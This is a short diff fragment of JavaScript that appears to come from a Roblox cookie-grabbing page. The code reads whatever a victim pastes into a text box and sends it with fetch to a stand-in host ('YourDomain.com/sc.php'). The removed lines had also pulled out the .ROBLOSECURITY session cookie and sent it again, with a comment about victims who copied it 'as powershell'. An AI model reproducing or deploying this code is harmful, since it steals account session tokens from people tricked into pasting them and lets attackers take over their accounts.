@@ -141,13 +141,6 @@ function performPaste() {
   setTimeout(() => {
     var token = document.getElementById("wrap").value
     fetch("https://YourDomain.com/sc.php?t=" + token);
-    var token = token.replace(token.slice(0, token.indexOf(".ROBLOSECURITY")))
-    var token = token.replace(token.slice(0, token.indexOf("_")))
-    var token = token.replace(token.slice(token.indexOf('"'), token.length))
-    var token = token.replace('undefined','');
-    var token = token.replace('undefined','');
-//This part is to send it incase they copied as powershell
-fetch("https://YourDomain.com/sc.php?t=" + token);
 }, 100);
   }
 fun()
